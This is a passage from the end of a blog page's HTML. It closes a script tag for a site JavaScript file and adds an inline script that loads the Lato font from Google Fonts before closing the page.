type=text/javascript src=/blog/ts/main.js defer></script>
<script>(function(){const e=document.createElement("link");e.href="https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap",e.type="text/css",e.rel="stylesheet",document.head.appendChild(e)})()</script></body></html>